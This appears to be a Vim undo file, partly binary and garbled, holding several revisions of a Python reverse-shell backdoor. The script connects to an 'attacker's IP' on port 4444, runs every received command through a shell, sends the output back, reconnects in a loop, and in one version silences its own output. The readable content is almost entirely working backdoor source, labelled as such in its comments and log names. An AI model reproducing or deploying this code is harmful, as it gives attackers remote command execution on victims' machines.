Vim�UnDo� ��`T��X�B����&��8��z�X�����]   F   CSERVER_IP = "attacker_ip"  # Replace with the attacker's IP address                             f�d    _�                             ����                                                                                                                                                                                                                                                                                                                                                             f�_d    �                   �               5��                    :                       �      5�_�                           ����                                                                                                                                                                                                                                                                                                                                                             f�`�     �   
      ;      ;SERVER_IP = "attacker_ip"  # Replace with the attacker's IP5��    
                     �                      5�_�                           ����                                                                                                                                                                                                                                                                                                                                                v       f�`�    �   
      ;      0SERVER_IP = ""  # Replace with the attacker's IP5��    
                     �                      5�_�                            ����                                                                                                                                                                                                                                                                                                                                       ;           V        f�aD     �              ;   #!/usr/bin/env python3       import socket   import subprocess   	import os   import time   
import sys   import atexit       # Configuration   =SERVER_IP = "192.168.0.102"  # Replace with the attacker's IP   SERVER_PORT = 4444   RECONNECT_DELAY = 10  # seconds   "LOG_FILE = '/var/log/backdoor.log'       def log(message):   )    with open(LOG_FILE, 'a') as log_file:   &        log_file.write(message + '\n')       def setup():   6    # Redirect standard output and error to a log file   '    sys.stdout = open('/dev/null', 'w')   '    sys.stderr = open('/dev/null', 'w')   G    atexit.register(lambda: sys.stdout.close() if sys.stdout else None)   G    atexit.register(lambda: sys.stderr.close() if sys.stderr else None)       def connect():       while True:           try:   $            # Create a socket object   A            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   /            s.connect((SERVER_IP, SERVER_PORT))       .            # Receive commands from the server               while True:   /                command = s.recv(1024).decode()   -                if command.lower() == 'exit':                       break   /                elif command.startswith('cd '):                       try:   -                        os.chdir(command[3:])   4                        s.send(b"Changed directory")   *                    except Exception as e:   /                        s.send(str(e).encode())                   else:                       try:   M                        output = subprocess.check_output(command, shell=True)   &                        s.send(output)   *                    except Exception as e:   /                        s.send(str(e).encode())               s.close()           except Exception as e:   )            log(f"Connection error: {e}")   '            time.sleep(RECONNECT_DELAY)       if __name__ == "__main__":       setup()       connect()    5��            ;                      �             5�_�                            ����                                                                                                                                                                                                                                                                                                                                                  V        f�aG    �                   �               5��                    5                       �      5�_�                          ����                                                                                                                                                                                                                                                                                                                                                             f�ag     �   
      6      CSERVER_IP = "attacker_ip"  # Replace with the attacker's IP address5��    
                     �                      5�_�      	                     ����                                                                                                                                                                                                                                                                                                                                                             f�aj    �   
      6      8SERVER_IP = ""  # Replace with the attacker's IP address5��    
                     �                      �    
                    �                     5�_�      
           	           ����                                                                                                                                                                                                                                                                                                                                       6           V        f�c     �              6   #!/usr/bin/env python3       import socket   import subprocess   	import os   import time   
import sys   import atexit       # Configuration   ESERVER_IP = "192.168.0.102"  # Replace with the attacker's IP address   DSERVER_PORT = 4444         # Replace with the attacker's port number   @RECONNECT_DELAY = 10       # Seconds to wait before reconnecting       # Setup logging   def setup_logging():   3    sys.stdout = open('/var/log/backdoor.log', 'a')   9    sys.stderr = open('/var/log/backdoor_error.log', 'a')   G    atexit.register(lambda: sys.stdout.close() if sys.stdout else None)   G    atexit.register(lambda: sys.stderr.close() if sys.stderr else None)       def connect():       while True:           try:   G            print("Attempting to connect to the server...", flush=True)   A            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   /            s.connect((SERVER_IP, SERVER_PORT))   9            print("Connected to the server.", flush=True)                   while True:   /                command = s.recv(1024).decode()   -                if command.lower() == 'exit':                       break   /                elif command.startswith('cd '):                       try:   -                        os.chdir(command[3:])   4                        s.send(b"Changed directory")   *                    except Exception as e:   /                        s.send(str(e).encode())                   else:                       try:   M                        output = subprocess.check_output(command, shell=True)   &                        s.send(output)   *                    except Exception as e:   /                        s.send(str(e).encode())               s.close()           except Exception as e:   <            print(f"Connection error: {e}", file=sys.stderr)   '            time.sleep(RECONNECT_DELAY)       if __name__ == "__main__":       setup_logging()       connect()    5��            6                      �             5�_�   	              
           ����                                                                                                                                                                                                                                                                                                                                                  V        f�c    �                   �               5��                    D                       �	      5�_�   
                        ����                                                                                                                                                                                                                                                                                                                                                             f�c#     �   
      E      CSERVER_IP = "attacker_ip"  # Replace with the attacker's IP address5��    
                     �                      5�_�                           ����                                                                                                                                                                                                                                                                                                                                                             f�c(    �   
      E      8SERVER_IP = ""  # Replace with the attacker's IP address5��    
                     �                      5�_�                            ����                                                                                                                                                                                                                                                                                                                                       E           V        f�c�     �              E   #!/usr/bin/env python3       import socket   import subprocess   	import os   import time   
import sys   import atexit       # Configuration   ESERVER_IP = "192.168.0.102"  # Replace with the attacker's IP address   DSERVER_PORT = 4444         # Replace with the attacker's port number   @RECONNECT_DELAY = 10       # Seconds to wait before reconnecting       def setup_logging():   3    log_dir = os.path.expanduser('~/backdoor_logs')   '    os.makedirs(log_dir, exist_ok=True)   A    sys.stdout = open(os.path.join(log_dir, 'backdoor.log'), 'a')   G    sys.stderr = open(os.path.join(log_dir, 'backdoor_error.log'), 'a')   G    atexit.register(lambda: sys.stdout.close() if sys.stdout else None)   G    atexit.register(lambda: sys.stderr.close() if sys.stderr else None)       def connect():       while True:           try:   G            print("Attempting to connect to the server...", flush=True)   A            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)   /            s.connect((SERVER_IP, SERVER_PORT))   9            print("Connected to the server.", flush=True)                   while True:   /                command = s.recv(1024).decode()                   if not command:                       break   -                if command.lower() == 'exit':                       break   /                elif command.startswith('cd '):                       try:   -                        os.chdir(command[3:])   4                        s.send(b"Changed directory")   *                    except Exception as e:   /                        s.send(str(e).encode())   &                elif command == 'pwd':                       try:   1                        current_dir = os.getcwd()   4                        s.send(current_dir.encode())   *                    except Exception as e:   /                        s.send(str(e).encode())   %                elif command == 'ls':                       try:   J                        output = subprocess.check_output('ls', shell=True)   &                        s.send(output)   *                    except Exception as e:   /                        s.send(str(e).encode())                   else:                       try:   M                        output = subprocess.check_output(command, shell=True)   &                        s.send(output)   *                    except Exception as e:   /                        s.send(str(e).encode())               s.close()           except Exception as e:   <            print(f"Connection error: {e}", file=sys.stderr)   '            time.sleep(RECONNECT_DELAY)       if __name__ == "__main__":       setup_logging()       connect()    5��            E                      �	             5�_�                            ����                                                                                                                                                                                                                                                                                                                                                  V        f�c�     �                   �               5��                    E                       �	      5�_�                           ����                                                                                                                                                                                                                                                                                                                                                  V        f�d     �   
      F      CSERVER_IP = "attacker_ip"  # Replace with the attacker's IP address5��    
                     �                      5�_�                            ����                                                                                                                                                                                                                                                                                                                                                  V        f�d    �   
      F      8SERVER_IP = ""  # Replace with the attacker's IP address5��    
                     �                      5�_�                           ����                                                                                                                                                                                                                                                                                                                                                             f�a`     �   
      6      BSERVER_IP = attacker_ip"  # Replace with the attacker's IP address5��    
                     �                      5��